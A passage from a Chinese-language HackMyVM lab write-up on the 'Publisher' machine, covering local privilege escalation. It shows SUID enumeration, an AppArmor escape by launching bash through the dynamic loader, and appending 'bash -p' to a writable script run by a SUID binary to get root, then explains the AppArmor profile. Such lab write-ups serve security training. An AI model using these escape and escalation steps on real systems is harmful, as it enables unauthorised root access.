root root 52K Nov <span class=\"hljs-number\">29</span>  <span class=\"hljs-number\">2022</span> /usr/<span class=\"hljs-built_in\">bin</span>/chsh                                                                                                        \n-rwsr-xr-x <span class=\"hljs-number\">1</span> root root 67K Nov <span class=\"hljs-number\">29</span>  <span class=\"hljs-number\">2022</span> /usr/<span class=\"hljs-built_in\">bin</span>/passwd  --->  Apple_Mac_OSX(03-<span class=\"hljs-number\">2006</span>)/Solaris_8/<span class=\"hljs-number\">9</span>(<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">2004</span>)/SPARC_8/<span class=\"hljs-number\">9</span>/Sun_Solaris_2<span class=\"hljs-number\">.3</span>_to_2<span class=\"hljs-number\">.5</span><span class=\"hljs-number\">.1</span>(02-<span class=\"hljs-number\">1997</span>)       \n-rwsr-xr-x <span class=\"hljs-number\">1</span> root root 55K May <span class=\"hljs-number\">30</span>  <span class=\"hljs-number\">2023</span> /usr/<span class=\"hljs-built_in\">bin</span>/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-<span class=\"hljs-number\">1699.32</span><span class=\"hljs-number\">.7</span>_except_xnu-<span class=\"hljs-number\">1699.24</span><span class=\"hljs-number\">.8</span>                                  \n-rwsr-xr-x <span class=\"hljs-number\">1</span> root root 67K May <span class=\"hljs-number\">30</span>  <span class=\"hljs-number\">2023</span> /usr/<span class=\"hljs-built_in\">bin</span>/su                                                                                                          \n-rwsr-xr-x <span class=\"hljs-number\">1</span> root root 44K Nov <span class=\"hljs-number\">29</span>  <span class=\"hljs-number\">2022</span> /usr/<span class=\"hljs-built_in\">bin</span>/newgrp  --->  HP-UX_10<span class=\"hljs-number\">.20</span>                                                                                   \n-rwsr-xr-x <span class=\"hljs-number\">1</span> root root 31K Feb <span class=\"hljs-number\">21</span>  <span class=\"hljs-number\">2022</span> /usr/<span class=\"hljs-built_in\">bin</span>/pkexec  --->  Linux4<span class=\"hljs-number\">.10</span>_to_5<span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.17</span>(CVE-<span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">13272</span>)/rhel_6(CVE-<span class=\"hljs-number\">2011</span>-<span class=\"hljs-number\">1485</span>)/Generic_CVE-<span class=\"hljs-number\">2021</span>-<span class=\"hljs-number\">4034</span>               \n-rwsr-xr-x <span class=\"hljs-number\">1</span> root root 39K May <span class=\"hljs-number\">30</span>  <span class=\"hljs-number\">2023</span> /usr/<span class=\"hljs-built_in\">bin</span>/umount  --->  BSD/Linux(08-<span class=\"hljs-number\">1996</span>)         \n</code></pre>\n<p>使用<code>strings</code>查看<code>run_container</code> 关键字</p>\n<pre><code class=\"hljs language-python\">/lib64/ld-linux-x86-<span class=\"hljs-number\">64.</span>so<span class=\"hljs-number\">.2</span>\nlibc.so<span class=\"hljs-number\">.6</span>\n__stack_chk_fail           \nexecve                        \n__cxa_finalize     \n__libc_start_main\nGLIBC_2<span class=\"hljs-number\">.2</span><span class=\"hljs-number\">.5</span>   \nGLIBC_2<span class=\"hljs-number\">.4</span>   \n_ITM_deregisterTMCloneTable\n__gmon_start__ \n_ITM_registerTMCloneTable\nu+UH                 \n[]A\\A]A^A_                                                                                                                                                   \n/<span class=\"hljs-built_in\">bin</span>/bash                                                                                                                                                    \n/opt/run_container.sh                                                                                                                                        \n:*<span class=\"hljs-number\">3</span>$<span class=\"hljs-string\">\"                                                                                                                                                        \nGCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0                                                                                                                   \ncrtstuff.c                                                                                                                                                   \nderegister_tm_clones                                                                                                                                         \n__do_global_dtors_aux                                                                                                                                        \ncompleted.8061                                                                                                                                               \n__do_global_dtors_aux_fini_array_entry                                                                                                                       \nframe_dummy                                                                                                                                                  \n__frame_dummy_init_array_entry                                                                                                                               \nrun_container.c                                                                                                                                              \n__FRAME_END__                                                                                                                                                \n__init_array_end                                                                                                                                             \n_DYNAMIC                                                                                                                                                     \n__init_array_start                                                                                                                                           \n__GNU_EH_FRAME_HDR                    \n_GLOBAL_OFFSET_TABLE_                                                         \n__libc_csu_fini                                                               \n_ITM_deregisterTMCloneTable\n_edata   \n__stack_chk_fail@@GLIBC_2.4\n__libc_start_main@@GLIBC_2.2.5\nexecve@@GLIBC_2.2.5\n__data_start     \n__gmon_start__\n__dso_handle\n_IO_stdin_used             \n__libc_csu_init\n__bss_start              \nmain   \n__TMC_END__                                                                                                                                                  \n_ITM_registerTMCloneTable                                                                                                                                    \n__cxa_finalize@@GLIBC_2.2.5                                                                                                                                  \n.symtab                                                                                                                                                      \n.strtab                                                                                                                                                      \n.shstrtab                                                                                                                                                    \n.interp                                                                                                                                                      \n.note.gnu.property                                                                                                                                           \n.note.gnu.build-id                                                                                                                                           \n.note.ABI-tag                                                                                                                                                \n.gnu.hash                                                                                                                                                    \n.dynsym                                                                                                                                                      \n.dynstr                                                                                                                                                      \n.gnu.version                                                                                                                                                 \n.gnu.version_r                                                                                                                                               \n.rela.dyn                                                                                                                                                    \n.rela.plt                                                                                                                                                    \n.init                                 \n.plt.got                                                                      \n.plt.sec                                                                      \n.text                      \n.fini    \n.rodata                    \n.eh_frame_hdr                 \n.eh_frame          \n.init_array      \n.fini_array   \n.dynamic    \n.data                      \n.bss           \n.comment  \n</span></code></pre>\n<p>发现关键字 <code>/opt/run_container.sh</code>  <code>/lib64/ld-linux-x86-64.so.2</code></p>\n<p>应该是 <code>run_container</code> 会执行<code>run_container.sh</code> ，看看<code>run_container.sh</code> 是否有修改权限</p>\n<pre><code class=\"hljs language-python\">think@publisher:/usr/lib64$ ls -al /opt/run_container.sh\n-rwxrwxrwx <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">1715</span> Mar <span class=\"hljs-number\">29</span>  <span class=\"hljs-number\">2024</span> /opt/run_container.sh\n</code></pre>\n<p>尝试修改，无法修改</p>\n<pre><code class=\"hljs language-python\">think@publisher:/usr/lib64$ echo <span class=\"hljs-string\">\"bash -p\"</span> >> /opt/run_container.sh\n-ash: /opt/run_container.sh: Permission denied\n</code></pre>\n<p>没懂怎么利用，看了作者的<code>WP</code> （你们的<code>esay</code>好难）</p>\n<blockquote>\n<p>首先我们可以看到<em><strong>AppArmor</strong></em>已<em><strong>启用</strong></em>：</p>\n<p><img src=\"/post-images/HackMyVMPublisher/image23.png\" alt=\"image.png\"></p>\n<p>然后我们注意到我们的shell不是<strong>bash</strong>而是<strong>ash：</strong></p>\n<p><img src=\"/post-images/HackMyVMPublisher/image24.png\" alt=\"image.png\"></p>\n<p>然后我们还看到我们当前的 shell有一个<strong>AppArmor配置文件：</strong></p>\n<p><a href=\"https://miro.medium.com/v2/resize:fit:777/0*pGAUT27loR_WNe7d\"></a></p>\n</blockquote>\n<p>才看到现在的<code>shell</code>不是<code>bash</code>，而是<code>ash</code></p>\n<pre><code class=\"hljs language-python\">think@publisher:/usr/lib64$ env\nSHELL=/usr/sbin/ash\n</code></pre>\n<blockquote>\n<p>我已经使用内核库来生成不受限制的 bash shell：</p>\n<pre><code class=\"hljs language-bash\">/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2 /bin/bash\n</code></pre>\n<p>执行此命令时，它会使用指定的<strong>动态链接器/加载器</strong>( <strong>ld-linux-x86–64.so.2</strong> ) 来加载所需的共享库并启动**/bin/bash** shell。这种使用二进制文件直接调用链接器/加载器的方法是一种通过明确指定要用于该特定二进制文件的动态链接器/加载器来执行二进制文件的方法</p>\n</blockquote>\n<p>我们拥有对<code>/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2</code>拥有完全的权限</p>\n<pre><code class=\"hljs language-python\">think@publisher:/usr/lib64$ ls -al /usr/lib/x86_64-linux-gnu/ld-linux-x86-<span class=\"hljs-number\">64.</span>so<span class=\"hljs-number\">.2</span> \nlrwxrwxrwx <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">10</span> Nov <span class=\"hljs-number\">22</span>  <span class=\"hljs-number\">2023</span> /usr/lib/x86_64-linux-gnu/ld-linux-x86-<span class=\"hljs-number\">64.</span>so<span class=\"hljs-number\">.2</span> -> ld-<span class=\"hljs-number\">2.31</span>.so\n</code></pre>\n<blockquote>\n<p>然后我在脚本中添加了“ <strong>bash -p”并运行了SUID</strong>二进制文件</p>\n</blockquote>\n<pre><code class=\"hljs language-python\">think@publisher:/usr/lib64$ echo <span class=\"hljs-string\">\"bash -p\"</span> >> /opt/run_container.sh \nthink@publisher:/usr/lib64$ /usr/sbin/run_container \n<span class=\"hljs-type\">List</span> of Docker containers:\nID: 41c976e507f8 | Name: jovial_hertz | Status: Up <span class=\"hljs-number\">2</span> hours\n\nEnter the ID of the container <span class=\"hljs-keyword\">or</span> leave blank to create a new one: \n/opt/run_container.sh: line <span class=\"hljs-number\">16</span>: validate_container_id: command <span class=\"hljs-keyword\">not</span> found \n<span class=\"hljs-number\">1</span>) Start Container\n<span class=\"hljs-number\">2</span>) Stop Container\n<span class=\"hljs-number\">3</span>) Restart Container\n<span class=\"hljs-number\">4</span>) Create Container\n<span class=\"hljs-number\">5</span>) Quit\nChoose an action <span class=\"hljs-keyword\">for</span> a container: <span class=\"hljs-number\">1</span>\nError response <span class=\"hljs-keyword\">from</span> daemon: page <span class=\"hljs-keyword\">not</span> found\nError: failed to start containers: \nbash-<span class=\"hljs-number\">5.0</span><span class=\"hljs-comment\"># </span>\n</code></pre>\n<p>获得<code>ROOT</code>权限</p>\n<pre><code class=\"hljs language-python\">bash-<span class=\"hljs-number\">5.0</span><span class=\"hljs-comment\"># id</span>\nuid=<span class=\"hljs-number\">1000</span>(think) gid=<span class=\"hljs-number\">1000</span>(think) euid=<span class=\"hljs-number\">0</span>(root) egid=<span class=\"hljs-number\">0</span>(root) groups=<span class=\"hljs-number\">0</span>(root),<span class=\"hljs-number\">1000</span>(think)\nbash-<span class=\"hljs-number\">5.0</span><span class=\"hljs-comment\">#</span>\n</code></pre>\n<h3>RootFlag</h3>\n<pre><code class=\"hljs language-python\">bash-<span class=\"hljs-number\">5.0</span><span class=\"hljs-comment\"># cat root.txt</span>\n3a4225cc9e85709adda6ef55d6a4f2ca \n</code></pre>\n<h2>为什么OPT不可以访问呢？</h2>\n<blockquote>\n<p><a href=\"https://zhuanlan.zhihu.com/p/547772872\">https://zhuanlan.zhihu.com/p/547772872</a></p>\n</blockquote>\n<p>首先我们的<code>shell</code>是<code>ASH</code></p>\n<p>其次是<code>apparmor</code> 限制了，<code>apparmor</code> 可以对程序进行访问控制，靶机里就是限制呢我们的<code>shell</code> <code>ASH</code> ，下面是对ASH限制的配置文件</p>\n<pre><code class=\"hljs language-python\">bash-<span class=\"hljs-number\">5.0</span><span class=\"hljs-comment\"># cd /etc/apparmor.d/</span>\nbash-<span class=\"hljs-number\">5.0</span><span class=\"hljs-comment\"># ls</span>\nabi           disable         local        nvidia_modprobe  tunables     usr.sbin.ash       usr.sbin.mysqld    usr.sbin.tcpdump\nabstractions  force-complain  lsb_release  sbin.dhclient    usr.<span class=\"hljs-built_in\">bin</span>.man  usr.sbin.ippusbxd  usr.sbin.rsyslogd\nbash-<span class=\"hljs-number\">5.0</span><span class=\"hljs-comment\"># cat usr.sbin.ash </span>\n<span class=\"hljs-comment\">#include &#x3C;tunables/global></span>\n\n/usr/sbin/ash flags=(complain) {\n  <span class=\"hljs-comment\">#include &#x3C;abstractions/base></span>\n  <span class=\"hljs-comment\">#include &#x3C;abstractions/bash></span>\n  <span class=\"hljs-comment\">#include &#x3C;abstractions/consoles></span>\n  <span class=\"hljs-comment\">#include &#x3C;abstractions/nameservice></span>\n  <span class=\"hljs-comment\">#include &#x3C;abstractions/user-tmp></span>\n\n  <span class=\"hljs-comment\"># Remove specific file path rules</span>\n  <span class=\"hljs-comment\"># Deny access to certain directories</span>\n  deny /opt/ r,\n  deny /opt/** rwx,\n  /usr/<span class=\"hljs-built_in\">bin</span>/** mrix,\n  /usr/sbin/** mrix,\n\n  <span class=\"hljs-comment\"># Simplified rule for accessing /home directory</span>\n  owner /home/** rwix,\n}\n\n</code></pre>\n<p>可以看到是 <code>deny /opt/ r</code>  <code>deny /opt/** rwx</code>，限制了我们对<code>OPT</code>文件夹里边的文件的所有权限</p>\n<p>因此我们通过动态链接库回到 <code>bash</code> 环境后，改配置文件就对我们不起效了</p>","title":"HackMyVM - Publisher","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机","description":"Publisher.\n\n https://hackmyvm.eu/machines/machine.php?vm=Publisher\n \n\nNotes: I hope you will enjoy it.\n\n信息收集\n\n\n\n新装了DVWS尝试一下，结果和nmap扫描的差不多\n\n\n\n渗透\n\n因为此只存在80端口和22端口，所以优先级： `80` `22`\n\n访问一下`web`页面，蛮复古的，发现内容..."},"recentPosts":[{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"}]},"__N_SSG":true}